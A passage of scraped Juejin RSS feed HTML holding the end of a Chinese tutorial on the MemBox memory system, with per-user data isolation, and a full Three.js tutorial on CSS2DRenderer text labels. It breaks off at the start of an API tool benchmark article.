<p>👤 Seven：我最喜欢的编程语言是 Python</p>
<p>🤖 MemBox：收到！我已经记下来了：你最喜欢的编程语言是 Python。</p>
</blockquote>
<p><strong>用户 B（Jane）的对话：</strong></p>
<blockquote>
<p>👤 Jane：我最喜欢的编程语言是什么？</p>
<p>🤖 MemBox：你还没有告诉我你最喜欢的编程语言是什么呢！要不要现在告诉我，让我帮你记下来？</p>
</blockquote>
<p>可以看到，Seven 的偏好不会泄露给 Jane。这是通过 <code>user_id</code> 在存储和检索时的过滤实现的： SeekDB 在底层会将 <code>user_id</code> 作为过滤条件，确保查询结果只包含当前用户的数据。</p>
<h2 data-id="heading-30">10. 总结</h2>
<p>本文介绍了如何使用 SeekDB 和 PowerMem 构建一个多模态智能记忆系统 MemBox。通过 SeekDB 的向量检索能力和 PowerMem 的智能记忆提取，MemBox 能够自动从对话中提取关键信息、构建用户画像，并在后续对话中提供个性化回复。前端基于 Vercel AI SDK 实现了流式对话和多模态图片理解，后端通过 FastAPI 提供记忆存储和检索服务。整个系统还支持多用户隔离，确保每个用户的数据安全独立。</p>
<h2 data-id="heading-31">11. 参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">SeekDB 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem" target="_blank" title="https://github.com/oceanbase/powermem" ref="nofollow noopener noreferrer">PowerMem 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev" target="_blank" title="https://ai-sdk.dev" ref="nofollow noopener noreferrer">Vercel AI SDK</a></li>
</ul>
<h2 data-id="heading-32">12 欢迎关注</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78dd2973863040e5b0eb2a4abcc59ec5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=YJdIUwJPjY5Fsixz%2F8TQpphiKkQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Three.js 实战：使用 DOM/CSS 打造高性能 3D 文字]]></title>    <link>https://juejin.cn/post/7597326073671516175</link>    <guid>https://juejin.cn/post/7597326073671516175</guid>    <pubDate>2026-01-20T14:21:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671516175" data-draft-id="7596186565270437903" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Three.js 实战：使用 DOM/CSS 打造高性能 3D 文字"/> <meta itemprop="keywords" content="前端,WebGL,three.js"/> <meta itemprop="datePublished" content="2026-01-20T14:21:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烛阴"/> <meta itemprop="url" content="https://juejin.cn/user/950397795841032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Three.js 实战：使用 DOM/CSS 打造高性能 3D 文字
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/950397795841032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烛阴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:21:25.000Z" title="Tue Jan 20 2026 14:21:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Three.js 实战：使用 DOM/CSS 打造高性能 3D 文字</h2>
<p>在 Three.js 中渲染文字有多种方案，本文介绍一种高性能且灵活的方案：<strong>CSS2DRenderer</strong>。它能将 DOM 元素无缝嵌入 3D 场景，同时保留 CSS 的全部能力。</p>
<h3 data-id="heading-1">为什么选择 DOM/CSS 方案？</h3>




















<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>TextGeometry</td><td>真正的 3D 几何体</td><td>性能开销大，需加载字体文件</td></tr><tr><td><strong>CSS2DRenderer</strong></td><td>清晰锐利、CSS 全特性、高性能</td><td>无法被 3D 物体遮挡</td></tr></tbody></table>
<p>CSS2DRenderer 的核心优势：</p>
<ul>
<li><strong>文字永远清晰</strong>：浏览器原生渲染，不受 3D 缩放影响</li>
<li><strong>CSS 全特性</strong>：阴影、渐变、动画、<code>backdrop-filter</code> 磨砂玻璃效果</li>
<li><strong>性能优异</strong>：DOM 渲染与 WebGL 渲染分离，互不干扰</li>
</ul>
<h3 data-id="heading-2">核心实现</h3>
<h4 data-id="heading-3">1. 初始化双渲染器</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">CSS2DRenderer</span>, <span class="hljs-title class_">CSS2DObject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/renderers/CSS2DRenderer.js'</span>;

<span class="hljs-comment">// WebGL 渲染器（渲染 3D 场景）</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// CSS2D 渲染器（渲染 DOM 标签）</span>
<span class="hljs-keyword">const</span> labelRenderer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DRenderer</span>();
labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(labelRenderer.<span class="hljs-property">domElement</span>.<span class="hljs-property">style</span>, {
  <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>,
  <span class="hljs-attr">top</span>: <span class="hljs-string">'0'</span>,
  <span class="hljs-attr">pointerEvents</span>: <span class="hljs-string">'none'</span> <span class="hljs-comment">// 关键：让鼠标事件穿透</span>
});
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(labelRenderer.<span class="hljs-property">domElement</span>);
</code></pre>
<p><strong>关键点</strong>：<code>pointerEvents: 'none'</code> 让鼠标事件穿透 DOM 层，否则无法拖拽 3D 场景。</p>
<h4 data-id="heading-4">2. 创建 CSS2D 标签</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">createLabel</span> = (<span class="hljs-params">text, position</span>) =&gt; {
  <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  div.<span class="hljs-property">className</span> = <span class="hljs-string">'label'</span>;
  div.<span class="hljs-property">textContent</span> = text;
  <span class="hljs-keyword">const</span> label = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DObject</span>(div);
  label.<span class="hljs-property">position</span>.<span class="hljs-title function_">copy</span>(position);
  <span class="hljs-keyword">return</span> label;
};

<span class="hljs-comment">// 将标签添加到 3D 物体上</span>
earth.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">createLabel</span>(<span class="hljs-string">'Earth'</span>, <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0</span>)));
</code></pre>
<p>标签添加到 <code>earth</code> 网格后，会自动跟随地球的旋转和位移。</p>
<h4 data-id="heading-5">3. 双渲染器同步渲染</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  renderer.<span class="hljs-title function_">render</span>(scene, camera);      <span class="hljs-comment">// 渲染 3D 场景</span>
  labelRenderer.<span class="hljs-title function_">render</span>(scene, camera); <span class="hljs-comment">// 渲染 DOM 标签</span>
}
</code></pre>
<h4 data-id="heading-6">4. CSS 样式</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.label</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFF</span>;
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Helvetica Neue'</span>, sans-serif;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.6</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">4px</span>); <span class="hljs-comment">/* 磨砂玻璃效果 */</span>
}
</code></pre>
<p><code>backdrop-filter: blur()</code> 实现的磨砂玻璃效果，在纯 WebGL 中需要复杂的后处理才能实现，而 CSS 一行代码搞定。</p>
<h3 data-id="heading-7">完整代码</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">OrbitControls</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/controls/OrbitControls.js'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CSS2DRenderer</span>, <span class="hljs-title class_">CSS2DObject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/renderers/CSS2DRenderer.js'</span>;

<span class="hljs-comment">// 场景、相机</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, innerWidth / innerHeight, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;

<span class="hljs-comment">// WebGL 渲染器</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
renderer.<span class="hljs-title function_">setPixelRatio</span>(devicePixelRatio);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// CSS2D 渲染器</span>
<span class="hljs-keyword">const</span> labelRenderer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DRenderer</span>();
labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(labelRenderer.<span class="hljs-property">domElement</span>.<span class="hljs-property">style</span>, {
  <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>,
  <span class="hljs-attr">top</span>: <span class="hljs-string">'0'</span>,
  <span class="hljs-attr">pointerEvents</span>: <span class="hljs-string">'none'</span>
});
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(labelRenderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// 轨道控制器</span>
<span class="hljs-keyword">const</span> controls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrbitControls</span>(camera, renderer.<span class="hljs-property">domElement</span>);
controls.<span class="hljs-property">enableDamping</span> = <span class="hljs-literal">true</span>;

<span class="hljs-comment">// 创建地球</span>
<span class="hljs-keyword">const</span> earth = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SphereGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshStandardMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x2233ff</span>, <span class="hljs-attr">roughness</span>: <span class="hljs-number">0.5</span> })
);
scene.<span class="hljs-title function_">add</span>(earth);

<span class="hljs-comment">// 生成地球纹理</span>
<span class="hljs-keyword">const</span> canvas = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'canvas'</span>), { <span class="hljs-attr">width</span>: <span class="hljs-number">512</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">512</span> });
<span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#1e90ff'</span>;
ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">512</span>, <span class="hljs-number">512</span>);
ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#228b22'</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
  ctx.<span class="hljs-title function_">beginPath</span>();
  ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">512</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">512</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">50</span> + <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);
  ctx.<span class="hljs-title function_">fill</span>();
}
earth.<span class="hljs-property">material</span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CanvasTexture</span>(canvas);

<span class="hljs-comment">// 创建标签工厂函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">createLabel</span> = (<span class="hljs-params">text, position</span>) =&gt; {
  <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  div.<span class="hljs-property">className</span> = <span class="hljs-string">'label'</span>;
  div.<span class="hljs-property">textContent</span> = text;
  <span class="hljs-keyword">const</span> label = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DObject</span>(div);
  label.<span class="hljs-property">position</span>.<span class="hljs-title function_">copy</span>(position);
  <span class="hljs-keyword">return</span> label;
};

earth.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">createLabel</span>(<span class="hljs-string">'Earth'</span>, <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0</span>)));

<span class="hljs-comment">// 光源</span>
scene.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AmbientLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">0.5</span>));
<span class="hljs-keyword">const</span> dirLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">0.8</span>);
dirLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>);
scene.<span class="hljs-title function_">add</span>(dirLight);

<span class="hljs-comment">// 动画循环</span>
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  earth.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.005</span>;
  controls.<span class="hljs-title function_">update</span>();
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  labelRenderer.<span class="hljs-title function_">render</span>(scene, camera);
})();

<span class="hljs-comment">// 响应窗口变化</span>
<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> {
  camera.<span class="hljs-property">aspect</span> = innerWidth / innerHeight;
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
  labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
});
</code></pre>
<p>📂 <strong>核心代码与完整示例：</strong>     <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqq790git%2Fmy-three-app.git" target="_blank" title="https://github.com/qq790git/my-three-app.git" ref="nofollow noopener noreferrer">my-three-app</a></p>
<h3 data-id="heading-8">总结</h3>
<p><strong>如果你喜欢本教程，记得点赞+收藏！关注我获取更多Three.js开发干货</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6款API工具性能实测，谁才是王者？]]></title>    <link>https://juejin.cn/post/7597251197426384922</link>    <guid>https://juejin.cn/post/7597251197426384922</guid>    <pubDate>2026-01-20T14:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597251197426384922" data-draft-id="7597258378590699530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6款API工具性能实测，谁才是王者？"/> <meta itemprop="keywords" content="前端,后端,测试"/> <meta itemprop="datePublished" content="2026-01-20T14:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MegatronKing"/> <meta itemprop="url" content="https://juejin.cn/user/2559318798642792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6款API工具性能实测，谁才是王者？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2559318798642792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MegatronKing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:23:13.000Z" title="Tue Jan 20 2026 14:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li 